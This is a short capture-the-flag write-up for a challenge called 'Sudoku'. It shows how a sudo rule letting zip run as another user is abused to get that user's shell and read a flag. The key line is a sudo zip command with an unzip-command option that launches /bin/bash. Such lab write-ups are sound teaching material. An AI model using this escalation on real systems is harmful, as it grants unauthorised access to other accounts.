---
title: "SUDOKU"
chall_name: "Sudoku"
category: "pwn"
description: ""
date: 2021-07-08T13:48:21-04:00
weight: 20
draft: false
info: ""
points: "128"
author: "BisBis"
---

# Sudoku

First we connect via ssh with given login/password

We when connect, we are prompted with a message : 

![capture1](/files/phack21/sudoku/c1.PNG)

I checked the rights on the flag file :

![capture2](/files/phack21/sudoku/c2.PNG)

We can see that only user master can read the file.
It means that we have to do some kinds of privilege escalations in order to read the file.

First thing that come to my mind is to check if there is some commands that we are able to run as others users.

```shell
sudo -l
```

![capture3](/files/phack21/sudoku/c3.PNG)

We can see that we can use the zip command as master user withtout being asked for a password.

So I decided to check on google if a privilege escalation is possible with zip command and guess what...
It's possible! So let's get into it

Let's create a file in /tmp directory : 

```shell
touch /tmp/test.txt
```

Then : sudo -u master zip /tmp/myzip.zip /tmp/test.txt -T --unzip-command='sh -c /bin/bash'


![capture4](/files/phack21/sudoku/c4.PNG)


That's it ! We're master user so it's time for us to get the flag : 

![capture5](/files/phack21/sudoku/c5.PNG)


Documentation : https://www.programmersought.com/article/14176332182/


